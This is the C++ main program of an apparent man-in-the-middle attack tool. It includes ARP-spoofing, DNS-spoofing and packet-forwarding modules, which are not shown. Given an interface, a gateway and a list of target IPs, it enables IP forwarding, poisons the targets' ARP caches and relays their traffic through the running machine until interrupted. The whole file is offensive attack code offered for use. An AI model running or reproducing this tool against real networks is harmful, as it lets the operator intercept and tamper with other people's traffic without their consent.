#include "network_utils.hpp"
#include "arp_spoof.hpp"
#include "dns_spoof.hpp"
#include "packet_forwarder.hpp"
#include <csignal>
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <atomic>

using namespace std;

atomic<bool> global_running(true);

void signal_handler(int signum) {
    if (signum == SIGINT) {
        cout << "\nExiting program...\n";
        global_running = false;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        cerr << "Usage: " << argv[0] << " <interface> <gateway IP> <target IP1> [target IP2 ...]\n";
        return 1;
    }
    
    string interface = argv[1];
    string gateway_ip = argv[2];
    
    ArpSpoofer::enable_ip_forwarding();
    signal(SIGINT, signal_handler);
    
    // ArpSpoofer 객체 생성 및 초기화
    ArpSpoofer* spoofer = new ArpSpoofer(interface);
    atexit([](){ ArpSpoofer::disable_ip_forwarding(); });
    
    if (!spoofer->initialize()) {
        delete spoofer;
        return 1;
    }
    if (!spoofer->set_gateway(gateway_ip)) {
        delete spoofer;
        return 1;
    }
    for (int i = 3; i < argc; i++) {
        string target_ip = argv[i];
        if (!spoofer->add_target(target_ip))
            cerr << "Failed to add target " << target_ip << "\n";
    }
    spoofer->update_filter();
    spoofer->start_spoofing_all();
    
    // 패킷 포워딩 시작
    PacketForwarder forwarder(spoofer->get_handle(), spoofer);
    forwarder.start();
    
    cout << "Running... (Press Ctrl+C to exit)\n";
    
    while (global_running)
        sleep(1);
    
    forwarder.stop();
    spoofer->stop_all();
    delete spoofer;
    ArpSpoofer::disable_ip_forwarding();
    
    cout << "Program terminated normally.\n";
    return 0;
}
